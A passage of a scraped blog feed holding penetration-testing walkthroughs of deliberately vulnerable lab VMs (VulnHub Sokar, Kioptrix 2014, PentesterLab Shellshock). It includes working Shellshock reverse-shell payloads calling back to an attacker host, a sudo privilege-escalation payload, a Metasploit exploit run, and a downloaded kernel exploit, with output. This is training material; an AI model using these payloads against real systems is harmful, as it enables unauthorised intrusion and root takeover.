href=\"https://highon.coffee/blog/sokar-walkthrough/#shellshock-files-owned-by-user-bynarr\" id=\"markdown-toc-shellshock-files-owned-by-user-bynarr\">Shellshock files owned by user bynarr</a></li> \n     <li><a href=\"https://highon.coffee/blog/sokar-walkthrough/#shellshock-mail-spool-readable\" id=\"markdown-toc-shellshock-mail-spool-readable\">Shellshock mail spool readable</a></li> \n    </ul> </li> \n  </ul> </li> \n <li><a href=\"https://highon.coffee/blog/sokar-walkthrough/#reverse-shell\" id=\"markdown-toc-reverse-shell\">Reverse Shell</a></li> \n <li><a href=\"https://highon.coffee/blog/sokar-walkthrough/#local-enumeration\" id=\"markdown-toc-local-enumeration\">Local Enumeration</a></li> \n <li><a href=\"https://highon.coffee/blog/sokar-walkthrough/#shellshock-local-privilege-escalation\" id=\"markdown-toc-shellshock-local-privilege-escalation\">Shellshock Local Privilege Escalation</a></li> \n <li><a href=\"https://highon.coffee/blog/sokar-walkthrough/#root-flag\" id=\"markdown-toc-root-flag\">Root Flag</a></li> \n</ul> \n<h2 id=\"description\">Description</h2> \n<p>Sokar was a vulnhub competition, unfortunately I did not have enough free time to compete.</p> \n<p><strong>Author:</strong> @_RastaMouse</p> \n<p><strong>Download:</strong> <a href=\"https://www.vulnhub.com\">VulnHub</a></p> \n<h2 id=\"enumeration\">Enumeration</h2> \n<h3 id=\"port-scanning\">Port Scanning</h3> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">nmap <span class=\"nt\">-v</span> <span class=\"nt\">-p</span> 1-65535 <span class=\"nt\">-sV</span> <span class=\"nt\">-O</span> <span class=\"nt\">-sT</span> 192.168.30.148</code></pre> \n</figure> \n<h3 id=\"service-enumeration\">Service Enumeration</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Port</th> \n    <th>Service</th> \n    <th>Version Detection</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 591</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>HTTP</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Apache httpd 2.2.15 ((CentOS))</p> \n     </pc> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"http-enumeration\">HTTP Enumeration</h3> \n<p>Inspection of the Web Application revealed <code>/cgi-bin/cat</code> which indicated it could be vulnerable to shellshock.</p> \n<h3 id=\"shellshock\">Shellshock</h3> \n<p>The Shellshock exploit was used to execute remote commands on the target system, however a reverse shell or bind shell were not possible due to restrictive ingress and egress firewall rules. This made for a painful local enumeration of the system via <strong>Burp Suite</strong>.</p> \n<h4 id=\"identify-current-user\">Identify Current User</h4> \n<p><img src=\"https://highon.coffee/img/blog/sokar/shellshock-id.png\" alt=\"Shellshock ID\" /></p> \n<h4 id=\"shellshock-home-dir-perms\">Shellshock home dir perms</h4> \n<p><img src=\"https://highon.coffee/img/blog/sokar/shellshock-home-dirs.png\" alt=\"Shellshock home dir\" /></p> \n<h4 id=\"shellshock-files-owned-by-user-bynarr\">Shellshock files owned by user bynarr</h4> \n<p><img src=\"https://highon.coffee/img/blog/sokar/shellshock-find.png\" alt=\"Shellshock find command\" /></p> \n<p>The file <code>/tmp/stats</code> appeared to get updated every few minutes, indicating a cronjob <em>could</em> be running.</p> \n<h4 id=\"shellshock-mail-spool-readable\">Shellshock mail spool readable</h4> \n<p><img src=\"https://highon.coffee/img/blog/sokar/shellshock-mail.png\" alt=\"Shellshock mail\" /></p> \n<p>The above disclosed <code>bynarrs</code> passwords and the outbound port <code>51242</code> rule for the user.</p> \n<h2 id=\"reverse-shell\">Reverse Shell</h2> \n<p>The following shellshock payload was sent using Burp Suite:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">User-Agent: <span class=\"o\">()</span> <span class=\"o\">{</span> :<span class=\"p\">;</span><span class=\"o\">}</span><span class=\"p\">;</span><span class=\"nb\">echo</span><span class=\"p\">;</span>/bin/echo <span class=\"s1\">'/bin/bash -i &gt;&amp; /dev/tcp/192.168.221.139/51242 0&gt;&amp;1 '</span> <span class=\"o\">&gt;</span> /home/bynarr/.profile<span class=\"p\">;</span></code></pre> \n</figure> \n<p>The cronjob called the .profile file and execute the file contents.</p> \n<p>A reverse shell was successfully spawned as the user <code>bynarr</code></p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">[</span>root:~/Downloads]# nc.traditional <span class=\"nt\">-lp</span> 51242 <span class=\"nt\">-vvvv</span>\nlistening on <span class=\"o\">[</span>any] 51242 ...\n192.168.221.148: inverse host lookup failed: Unknown host\nconnect to <span class=\"o\">[</span>192.168.221.139] from <span class=\"o\">(</span>UNKNOWN<span class=\"o\">)</span> <span class=\"o\">[</span>192.168.221.148] 59533\nbash: no job control <span class=\"k\">in </span>this shell</code></pre> \n</figure> \n<h2 id=\"local-enumeration\">Local Enumeration</h2> \n<p>The following disclosed several bash environment variables were permitted to run as the user <code>bynarr</code> with sudo permissions.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">[</span>bynarr@sokar ~]<span class=\"nv\">$ </span><span class=\"nb\">sudo</span> <span class=\"nt\">-l</span>\n<span class=\"nb\">sudo</span> <span class=\"nt\">-l</span>\nMatching Defaults entries <span class=\"k\">for </span>bynarr on this host:\n    <span class=\"o\">!</span>requiretty, visiblepw, always_set_home, env_reset, <span class=\"nv\">env_keep</span><span class=\"o\">=</span><span class=\"s2\">\"COLORS\n    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS\"</span>, env_keep+<span class=\"o\">=</span><span class=\"s2\">\"MAIL PS1\n    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE\"</span>, env_keep+<span class=\"o\">=</span><span class=\"s2\">\"LC_COLLATE\n    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES\"</span>, env_keep+<span class=\"o\">=</span><span class=\"s2\">\"LC_MONETARY\n    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE\"</span>, env_keep+<span class=\"o\">=</span><span class=\"s2\">\"LC_TIME LC_ALL\n    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY\"</span>,\n    <span class=\"nv\">secure_path</span><span class=\"o\">=</span>/sbin<span class=\"se\">\\:</span>/bin<span class=\"se\">\\:</span>/usr/sbin<span class=\"se\">\\:</span>/usr/bin\n\nUser bynarr may run the following commands on this host:\n    <span class=\"o\">(</span>ALL<span class=\"o\">)</span> NOPASSWD: /home/bynarr/lime</code></pre> \n</figure> \n<h2 id=\"shellshock-local-privilege-escalation\">Shellshock Local Privilege Escalation</h2> \n<p>The following shellshock payload was crafted to successfully escalate permissions to root:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">sudo </span><span class=\"nv\">PS1</span><span class=\"o\">=</span><span class=\"s2\">\"() { :;} ;  /bin/sh\"</span> /home/bynarr/lime</code></pre> \n</figure> \n<h2 id=\"root-flag\">Root Flag</h2> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">[</span>bynarr@sokar tmp]<span class=\"nv\">$ </span><span class=\"nb\">sudo </span><span class=\"nv\">PS1</span><span class=\"o\">=</span><span class=\"s2\">\"() { :;} ;  /bin/sh\"</span> /home/bynarr/lime\n<span class=\"nb\">sudo </span><span class=\"nv\">PS1</span><span class=\"o\">=</span><span class=\"s2\">\"() { :;} ;  /bin/sh\"</span> /home/bynarr/lime\nsh-4.1# <span class=\"nb\">ls</span> <span class=\"nt\">-la</span> /home/bynarr/lime\n<span class=\"nb\">ls</span> <span class=\"nt\">-la</span> /home/bynarr/lime\n<span class=\"nt\">-rwxr-xr-x</span> 1 root root 368 Jan 27  2015 /home/bynarr/lime\nsh-4.1# <span class=\"nb\">cat</span> /root/flag\n<span class=\"nb\">cat</span> /root/flag\n                0   0\n                |   |\n            ____|___|____\n         0  |~ ~ ~ ~ ~ ~|   0\n         |  |   Happy   |   |\n      ___|__|___________|___|__\n      |/<span class=\"se\">\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/</span>|\n  0   |    B i r t h d a y    |   0\n  |   |/<span class=\"se\">\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/</span>|   |\n _|___|_______________________|___|__\n|/<span class=\"se\">\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/</span>|\n|                                   |\n|     V  u  l  n  H  u  b   <span class=\"o\">!</span> <span class=\"o\">!</span>     |\n| ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ |\n|___________________________________|\n\n<span class=\"o\">=====================================</span>\n| Congratulations on beating Sokar! |\n|                                   |\n|  Massive shoutout to g0tmi1k and  |\n| the entire community which makes  |\n|         VulnHub possible!         |\n|                                   |\n|    rasta_mouse <span class=\"o\">(</span>@_RastaMouse<span class=\"o\">)</span>     |\n<span class=\"o\">=====================================</span></code></pre> \n</figure> \n<p>Thanks for the VM :)</p>","descriptionType":"text/html","publishedDate":"Mon, 23 Feb 2015 14:00:10 +0000","feedId":11390,"bgimg":"https://highon.coffee/img/blog/sokar/shellshock-id.png","linkMd5":"9a07a9f7d1ee2dd1fba6af1e4fe197d9","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn40@2020_2/2020/08/25/01-24-54-549_5c4862da0ec4fbba.webp","destWidth":973,"destHeight":469,"sourceBytes":36235,"destBytes":32026,"author":"Arr0way","articleImgCdnMap":{"https://highon.coffee/img/blog/sokar/shellshock-id.png":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn40@2020_2/2020/08/25/01-24-54-549_5c4862da0ec4fbba.webp","https://highon.coffee/img/blog/sokar/shellshock-home-dirs.png":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn20@2020_6/2020/08/25/01-25-16-651_eb6d731ce8821237.webp","https://highon.coffee/img/blog/sokar/shellshock-find.png":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn24@2020_1/2020/08/25/01-25-14-619_2b011c34f76a8d29.webp","https://highon.coffee/img/blog/sokar/shellshock-mail.png":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn64@2020_6/2020/08/25/01-25-15-422_04ef50cca15f8e25.webp"},"publishedOrCreatedDate":1598318675553},{"createdTime":"2020-08-25 09:24:35","updatedTime":"2020-08-25 09:24:35","title":"Kioptrix Level 2014 Walkthrough","link":"https://highon.coffee/blog/kioptrix-level-2014-walkthrough/","description":"<div class=\"coffee-rating\"> \n <table> \n  <tbody> \n   <tr> \n    <td> <p><code>Coffee Difficulty Rating:</code></p> </td> \n    <td> <p><i class=\"fa fa-coffee\"></i></p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<ul id=\"markdown-toc\"> \n <li><a href=\"https://highon.coffee/blog/kioptrix-level-2014-walkthrough/#author-description\" id=\"markdown-toc-author-description\">Author Description</a></li> \n <li><a href=\"https://highon.coffee/blog/kioptrix-level-2014-walkthrough/#service-enumeration\" id=\"markdown-toc-service-enumeration\">Service Enumeration</a></li> \n <li><a href=\"https://highon.coffee/blog/kioptrix-level-2014-walkthrough/#web-application-interrogation\" id=\"markdown-toc-web-application-interrogation\">Web Application Interrogation</a></li> \n <li><a href=\"https://highon.coffee/blog/kioptrix-level-2014-walkthrough/#non-privileged-shell\" id=\"markdown-toc-non-privileged-shell\">Non Privileged Shell</a></li> \n <li><a href=\"https://highon.coffee/blog/kioptrix-level-2014-walkthrough/#local-privilege-escalation\" id=\"markdown-toc-local-privilege-escalation\">Local Privilege Escalation</a></li> \n</ul> \n<h2 id=\"author-description\">Author Description</h2> \n<p>The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.</p> \n<h2 id=\"service-enumeration\">Service Enumeration</h2> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Port</th> \n    <th>Service</th> \n    <th>Version Detection</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 80</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>HTTP</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 8080</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>HTTP</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)</p> \n     </pc> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h2 id=\"web-application-interrogation\">Web Application Interrogation</h2> \n<p><code>http://192.168.221.159:8080/</code> rendered a page 403 forbidden page. The Firefox UserAgent switcher was leveraged to change the browser to IE 6, exposing the web application <strong>PHPTAX</strong> (this took a while to figure out!):</p> \n<p><img src=\"https://highon.coffee/img/blog/kioptrix/phptax.png\" alt=\"phptax\" /></p> \n<p><img src=\"https://highon.coffee/img/blog/kioptrix/phptax2.png\" alt=\"phptax2\" /></p> \n<h2 id=\"non-privileged-shell\">Non Privileged Shell</h2> \n<p>Research discovered a metasploit module existed for phptax:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">msf <span class=\"o\">&gt;</span> use exploit/multi/http/phptax_exec\nmsf exploit<span class=\"o\">(</span>phptax_exec<span class=\"o\">)</span> <span class=\"o\">&gt;</span> <span class=\"nb\">set </span>RHOST 192.168.221.159\nRHOST <span class=\"o\">=&gt;</span> 192.168.221.159\nmsf exploit<span class=\"o\">(</span>phptax_exec<span class=\"o\">)</span> <span class=\"o\">&gt;</span> <span class=\"nb\">set </span>RPORT 8080\nRPORT <span class=\"o\">=&gt;</span> 8080\nmsf exploit<span class=\"o\">(</span>phptax_exec<span class=\"o\">)</span> <span class=\"o\">&gt;</span> <span class=\"nb\">set </span>TARGETURI /phptax/\nTARGETURI <span class=\"o\">=&gt;</span> /phptax/\nmsf exploit<span class=\"o\">(</span>phptax_exec<span class=\"o\">)</span> <span class=\"o\">&gt;</span> show options\n\nModule options <span class=\"o\">(</span>exploit/multi/http/phptax_exec<span class=\"o\">)</span>:\n\n   Name       Current Setting  Required  Description\n   <span class=\"nt\">----</span>       <span class=\"nt\">---------------</span>  <span class=\"nt\">--------</span>  <span class=\"nt\">-----------</span>\n   Proxies                     no        A proxy chain of format <span class=\"nb\">type</span>:host:port[,type:host:port][...]\n   RHOST      192.168.221.159  <span class=\"nb\">yes       </span>The target address\n   RPORT      8080             <span class=\"nb\">yes       </span>The target port\n   TARGETURI  /phptax/         <span class=\"nb\">yes       </span>The path to the web application\n   VHOST                       no        HTTP server virtual host\n\n\nExploit target:\n\n   Id  Name\n   <span class=\"nt\">--</span>  <span class=\"nt\">----</span>\n   0   PhpTax 0.8\n\n\nmsf exploit<span class=\"o\">(</span>phptax_exec<span class=\"o\">)</span> <span class=\"o\">&gt;</span> run\n\n<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> <span class=\"k\">*</span><span class=\"o\">]</span> Command shell session 2 opened <span class=\"o\">(</span>192.168.221.162:4444 -&gt; 192.168.221.159:62420<span class=\"o\">)</span> at 2016-01-07 class=\"o\">(</span>www<span class=\"o\">)</span></code></pre> \n</figure> \n<h2 id=\"local-privilege-escalation\">Local Privilege Escalation</h2> \n<p>The binary <code>fetch</code> was used to download a FreeBSD 9.0-9.1 mmap/ptrace - Privilege Escalation Exploit, fetch was used as the target didn’t contain the usual binaries for file download (wget, curl, etc).</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">wget\nwget: not found\n\ncurl\ncurl: not found\n\nfetch <span class=\"nt\">-o</span> exploit http://192.168.221.162:45/26368\nexploit                                               2215  B   32 MBps\n\n<span class=\"nb\">mv </span>exploit exploit.c\ngcc exploit.c <span class=\"nt\">-o</span> exploit\n./exploit\n\n<span class=\"nb\">id\n</span><span class=\"nv\">uid</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span> <span class=\"nv\">gid</span><span class=\"o\">=</span>0<span class=\"o\">(</span>wheel<span class=\"o\">)</span> <span class=\"nv\">egid</span><span class=\"o\">=</span>80<span class=\"o\">(</span>www<span class=\"o\">)</span> <span class=\"nb\">groups</span><span class=\"o\">=</span>80<span class=\"o\">(</span>www<span class=\"o\">)</span>\n/bin/sh <span class=\"nt\">-i</span>\nsh: can<span class=\"s1\">'t access tty; job control turned off\n# cd /root\n# ls\n.cshrc\n.history\n.k5login\n.login\n.mysql_history\n.profile\ncongrats.txt\nfolderMonitor.log\nhttpd-access.log\nlazyClearLog.sh\nmonitor.py\nossec-alerts.log\n# cat congrats.txt\nIf you are reading this, it means you got root (or cheated).\nCongratulations either way...\n\nHope you enjoyed this new VM of mine. As always, they are made for the beginner in\nmind, and not meant for the seasoned pentester. However this does not mean one\ncan'</span>t enjoy them.\n\nAs with all my VMs, besides getting <span class=\"s2\">\"root\"</span> on the system, the goal is to also\nlearn the basics skills needed to compromise a system. Most importantly, <span class=\"k\">in </span>my mind,\nare information gathering &amp; research. Anyone can throw massive amounts of exploits\nand <span class=\"s2\">\"hope\"</span> it works, but think about the traffic.. the logs... Best to take it\nslow, and <span class=\"nb\">read </span>up on the information you gathered and hopefully craft better\nmore targetted attacks.\n\nFor example, this system is FreeBSD 9. Hopefully you noticed this rather quickly.\nKnowing the OS gives you any idea of what will work and what won<span class=\"s1\">'t from the get go.\nDefault file locations are not the same on FreeBSD versus a Linux based distribution.\nApache logs aren'</span>t <span class=\"k\">in</span> <span class=\"s2\">\"/var/log/apache/access.log\"</span>, but <span class=\"k\">in</span> <span class=\"s2\">\"/var/log/httpd-access.log\"</span><span class=\"nb\">.</span>\nIt<span class=\"s1\">'s default document root is not \"/var/www/\" but in \"/usr/local/www/apache22/data\".\nFinding and knowing these little details will greatly help during an attack. Of course\nmy examples are specific for this target, but the theory applies to all systems.\n\nAs a small exercise, look at the logs and see how much noise you generated. Of course\nthe log results may not be accurate if you created a snapshot and reverted, but at least\nit will give you an idea. For fun, I installed \"OSSEC-HIDS\" and monitored a few things.\nDefault settings, nothing fancy but it should'</span>ve logged a few of your attacks. Look\nat the following files:\n/root/folderMonitor.log\n/root/httpd-access.log <span class=\"o\">(</span>softlink<span class=\"o\">)</span>\n/root/ossec-alerts.log <span class=\"o\">(</span>softlink<span class=\"o\">)</span>\n\nThe folderMonitor.log file is just a cheap script of mine to track created/deleted and modified\nfiles <span class=\"k\">in </span>2 specific folders. Since FreeBSD doesn<span class=\"s1\">'t support \"iNotify\", I couldn'</span>t use OSSEC-HIDS\n<span class=\"k\">for </span>this.\nThe httpd-access.log is rather self-explanatory <span class=\"nb\">.</span>\nLastly, the ossec-alerts.log file is OSSEC-HIDS is where it puts alerts when monitoring certain\nfiles. This one should<span class=\"s1\">'ve detected a few of your web attacks.\n\nFeel free to explore the system and other log files to see how noisy, or silent, you were.\nAnd again, thank you for taking the time to download and play.\nSincerely hope you enjoyed yourself.\n\nBe good...\n\n\nloneferret\nhttp://www.kioptrix.com\n\n\np.s.: Keep in mind, for each \"web attack\" detected by OSSEC-HIDS, by\ndefault it would'</span>ve blocked your IP <span class=\"o\">(</span>both <span class=\"k\">in </span>hosts.allow &amp; Firewall<span class=\"o\">)</span> <span class=\"k\">for\n</span>600 seconds. I was <span class=\"nb\">nice </span>enough to remove that part :<span class=\"o\">)</span></code></pre> \n</figure> \n<p>Thanks for the VM :)</p>","descriptionType":"text/html","publishedDate":"Tue, 15 Apr 2014 14:00:10 +0000","feedId":11390,"bgimg":"https://highon.coffee/img/blog/kioptrix/phptax.png","linkMd5":"67046a53305181950b0c6523ed34bae4","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn36@2020_6/2020/08/25/01-24-54-439_8334ddea96582525.webp","destWidth":996,"destHeight":224,"sourceBytes":21485,"destBytes":11618,"author":"Arr0way","articleImgCdnMap":{"https://highon.coffee/img/blog/kioptrix/phptax.png":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn36@2020_6/2020/08/25/01-24-54-439_8334ddea96582525.webp","https://highon.coffee/img/blog/kioptrix/phptax2.png":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn59@2020_5/2020/08/25/01-25-16-053_a66f5d47d14e803d.webp"},"publishedOrCreatedDate":1598318675556},{"createdTime":"2020-08-25 09:24:35","updatedTime":"2020-08-25 09:24:35","title":"Pen Testers Lab: Shellshock CVE-2014-6271 - Walkthrough","link":"https://highon.coffee/blog/shellshock-pen-testers-lab-walkthrough/","description":"<div class=\"coffee-rating\"> \n <table> \n  <tbody> \n   <tr> \n    <td> <p><code>Coffee Difficulty Rating:</code></p> </td> \n    <td> <p><i class=\"fa fa-coffee\"></i></p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<ul id=\"markdown-toc\"> \n <li><a href=\"https://highon.coffee/blog/shellshock-pen-testers-lab-walkthrough/#author-description\" id=\"markdown-toc-author-description\">Author Description</a></li> \n <li><a href=\"https://highon.coffee/blog/shellshock-pen-testers-lab-walkthrough/#host-enumeration\" id=\"markdown-toc-host-enumeration\">Host Enumeration</a> \n  <ul> \n   <li><a href=\"https://highon.coffee/blog/shellshock-pen-testers-lab-walkthrough/#port-scanning\" id=\"markdown-toc-port-scanning\">Port Scanning</a></li> \n   <li><a href=\"https://highon.coffee/blog/shellshock-pen-testers-lab-walkthrough/#service-enumeration\" id=\"markdown-toc-service-enumeration\">Service Enumeration</a></li> \n  </ul> </li> \n <li><a href=\"https://highon.coffee/blog/shellshock-pen-testers-lab-walkthrough/#website-inspection\" id=\"markdown-toc-website-inspection\">Website Inspection</a></li> \n <li><a href=\"https://highon.coffee/blog/shellshock-pen-testers-lab-walkthrough/#burp-suite---send-reverse-shellshock\" id=\"markdown-toc-burp-suite---send-reverse-shellshock\">Burp Suite - Send Reverse Shellshock</a></li> \n <li><a href=\"https://highon.coffee/blog/shellshock-pen-testers-lab-walkthrough/#reverse-shell\" id=\"markdown-toc-reverse-shell\">Reverse Shell</a></li> \n</ul> \n<h2 id=\"author-description\">Author Description</h2> \n<p>This course details the exploitation of the vulnerability <strong>CVE-2014-6271</strong> AKA <strong>Shellshock</strong>. This vulnerability impacts the Bourne Again Shell “Bash”. Bash is not usually available through a web application but can be indirectly exposed through a Common Gateway Interface “CGI”.</p> \n<p><strong>Author:</strong> PentesterLab</p> \n<p><strong>Download:</strong> <a href=\"https://www.vulnhub.com\">VulnHub</a></p> \n<div class=\"note info\"> \n <h5>This is not a challenge VM</h5> \n <p>This VM is part of the exercises provided by <a href=\"https://pentesterlab.com\">PenTestersLab.com</a>, it's not a challenge VM (there is no flag to capture). </p> \n</div> \n<h2 id=\"host-enumeration\">Host Enumeration</h2> \n<h3 id=\"port-scanning\">Port Scanning</h3> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">nmap <span class=\"nt\">-v</span> <span class=\"nt\">-p</span> 1-65535 <span class=\"nt\">-sV</span> <span class=\"nt\">-O</span> <span class=\"nt\">-sT</span> 192.168.221.144</code></pre> \n</figure> \n<h3 id=\"service-enumeration\">Service Enumeration</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Port</th> \n    <th>Service</th> \n    <th>Version Detection</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 22</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>SSH</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>OpenSSH 6.0 (protocol 2.0)</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 80</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>HTTP</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Apache httpd 2.2.21 ((Unix) DAV/2)</p> \n     </pc> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h2 id=\"website-inspection\">Website Inspection</h2> \n<p>Inspection of Squid using the metasploit module <code>auxiliary/scanner/http/squid_pivot_scanning</code> discovered port 80 was exposed via the proxy.</p> \n<p><img src=\"https://highon.coffee/img/blog/pentesterslab/shellshock/shellshock-burp.png\" alt=\"Shellshock Burp Suite\" /></p> \n<h2 id=\"burp-suite---send-reverse-shellshock\">Burp Suite - Send Reverse Shellshock</h2> \n<p>Burp Suite was used to manipulate the <code>User Agent:</code> and deliver the following payload:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">()</span> <span class=\"o\">{</span> ignored<span class=\"p\">;</span><span class=\"o\">}</span><span class=\"p\">;</span>/bin/bash <span class=\"nt\">-i</span> <span class=\"o\">&gt;</span>&amp; /dev/tcp/192.168.221.139/443 0&gt;&amp;1</code></pre> \n</figure> \n<p><img src=\"https://highon.coffee/img/blog/pentesterslab/shellshock/shellshock-payload-burp.png\" alt=\"Burp Suite Shellshock Payload\" /></p> \n<h2 id=\"reverse-shell\">Reverse Shell</h2> \n<p>Successfully connecting to the listening netcat instance:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">[</span>root:~]# nc.traditional <span class=\"nt\">-lp</span> 443 <span class=\"nt\">-vvv</span>\nlistening on <span class=\"o\">[</span>any] 443 ...\n192.168.221.144: inverse host lookup failed: Unknown host\nconnect to <span class=\"o\">[</span>192.168.221.139] from <span class=\"o\">(</span>UNKNOWN<span class=\"o\">)</span> <span class=\"o\">[</span>192.168.221.144] 44254\nbash: no job control <span class=\"k\">in </span>this shell\nbash-4.2<span class=\"nv\">$ </span><span class=\"nb\">id\nid\n</span><span class=\"nv\">uid</span><span class=\"o\">=</span>1000<span class=\"o\">(</span>pentesterlab<span class=\"o\">)</span> <span class=\"nv\">gid</span><span class=\"o\">=</span>50<span class=\"o\">(</span>staff<span class=\"o\">)</span> <span class=\"nb\">groups</span><span class=\"o\">=</span>50<span class=\"o\">(</span>staff<span class=\"o\">)</span>,100<span class=\"o\">(</span>pentesterlab<span class=\"o\">)</span></code></pre> \n</figure> \n<p>End of exercise.</p> \n<p>Thanks for the VM :)</p>","descriptionType":"text/html","publishedDate":"Tue, 30 Sep 2014 10:00:10 +0000","feedId":11390,"bgimg":"https://highon.coffee/img/blog/pentesterslab/shellshock/shellshock-burp.png","linkMd5":"0f9b032250236edb7e6e0d562d070a33","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn60@2020_5/2020/08/25/01-24-54-276_04a2fc87e052a27f.webp","destWidth":265,"destHeight":96,"sourceBytes":2933,"destBytes":3082,"author":"Arr0way","articleImgCdnMap":{"https://highon.coffee/img/blog/pentesterslab/shellshock/shellshock-burp.png":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn60@2020_5/2020/08/25/01-24-54-276_04a2fc87e052a27f.webp","https://highon.coffee/img/blog/pentesterslab/shellshock/shellshock-payload-burp.png":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn40@2020_3/2020/08/25/01-25-14-373_df053af6659ab4ba.webp"},"publishedOrCreatedDate":1598318675555},{"createdTime":"2020-08-25 09:24:35","updatedTime":"2020-08-25 09:24:35","title":"Linux Commands Cheat Sheet","link":"https://highon.coffee/blog/linux-commands-cheat-sheet/","description":"<ul id=\"markdown-toc\"> \n <li><a <ul> \n   <li><a href=\"https://highon.coffee/blog/linux-commands-cheat-sheet/#linux-network-commands\" id=\"markdown-toc-linux-network-commands\">Linux Network Commands</a></li> \n   <li><a    <li><a href=\"https://highon.coffee/blog/linux-commands-cheat-sheet/#yum-commands\" id=\"markdown-toc-yum-commands\">YUM Commands</a></li> \n     <li><a    </ul> </li> \n   <li><a href=\"https://highon.coffee/blog/linux-commands-cheat-sheet/#linux-user-management\" id=\"markdown-toc-linux-user-management\">Linux User Management</a></li> \n   <li><a href=\"https://highon.coffee/blog/linux-commands-cheat-sheet/#linux-compression-commands\" id=\"markdown-toc-linux-compression-commands\">Linux Compression Commands</a></li> \n   <li><a href=\"https://highon.coffee/blog/linux-commands-cheat-sheet/#linux-file-commands\" id=\"markdown-toc-linux-file-commands\">Linux File Commands</a></li> \n   <li><a href=\"https://highon.coffee/blog/linux-commands-cheat-sheet/#samba-commands\" id=\"markdown-toc-samba-commands\">Samba Commands</a></li> \n   <li><a href=\"https://highon.coffee/blog/linux-commands-cheat-sheet/#breaking-out-of-limited-shells\" id=\"markdown-toc-breaking-out-of-limited-shells\">Breaking Out of Limited Shells</a></li> \n   <li><a href=\"https://highon.coffee/blog/linux-commands-cheat-sheet/#misc-commands\" id=\"markdown-toc-misc-commands\">Misc Commands</a></li> \n   <li><a href=\"https://highon.coffee/blog/linux-commands-cheat-sheet/#linux-file-system-permissions\" id=\"markdown-toc-linux-file-system-permissions\">Linux File System Permissions</a></li> \n   <li><a href=\"https://highon.coffee/blog/linux-commands-cheat-sheet/#linux-interesting-files--dirs\" id=\"markdown-toc-linux-interesting-files--dirs\">Linux Interesting Files / Dir’s</a></li> \n  </ul> </li> \n</ul> \n<p>A collection of hopefully useful Linux Commands for pen testers, this is not a complete list but a collection of commonly used commands + syntax as a sort of “cheatsheet”, 